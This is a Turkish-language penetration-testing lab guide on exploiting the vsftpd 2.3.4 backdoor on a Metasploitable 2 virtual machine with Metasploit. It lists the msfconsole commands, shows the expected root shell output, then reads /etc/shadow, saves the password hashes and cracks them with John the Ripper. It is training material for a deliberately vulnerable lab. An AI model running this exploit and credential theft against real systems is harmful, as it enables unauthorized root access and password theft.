---
description: VSFTPD Güvenlik Açığı Kullanılarak Hedef Sisteme Sızılması
---

# Penetrasyon Testi Uygulaması

Kali makinede şu adımları gerçekleştirin:

1.Terminal penceresinde msfconsole yazın ve ENTER’a basın.

2.Metasploit konsolunda search vsftpd yazın ve ENTER’a basın.

3.Metasploit konsolunda use exploit/unix/ftp/vsftpd\_234\_backdoor yazın ve ENTER’a basın.

4.show options yazın ve ENTER’a basın.

5.set RHOST 192.168.2.42 yazın ve ENTER’a basın \(Metasploitable 2 IP\).

6.set RPORT 21 yazın ve ENTER’a basın.

7.set LHOST 192.168.2.143 yazın ve ENTER’a basın \(Kali IP\).

8.show payloads yazın ve ENTER’a basın. 

9.Metasploit konsolunda set PAYLOAD cmd/unix/interact yazın ve ENTER’a basın.

10.Metasploit konsolunda exploit yazın ve ENTER’a basın. 

Eğer düzgün bir şekilde çalışıyorsa aşağıdakileri görürsünüz:

•\[+\] Backdoor service has been spawned, handling…

•\[+\] uid=0\(root\) gid=0\(root\)

11.Komut satırında whoami yazın ve ENTER’a basın.

12.Komut satırında pwd yazın ve ENTER’a basın.

13.cat /etc/shadow yazın ENTER’a basın. 

14.Listelenen parola hash’lerini \(karmaları\) kopyalayarak \(CTRL-SHIFT-C veya sağ tıklama ile\) Desktop dizininde bir dosya oluşturup yapıştırın. Dosyayı parola-hashes olarak kaydedebilirsiniz.

15.Terminal ekranında hedef sistemden çıkmak için exit yazın ve ENTER’a basın.

16.Metasploit Framework konsolundan çıkmak için tekrar exit yazın.

17.john /Desktop/parola-hashes komutu ile elde ettiğiniz parola karmalarının parolalarını bulmak için bir John The Ripper taraması başlatın. Tam sonuç elde etmek için en az on dakika beklemelisiniz.

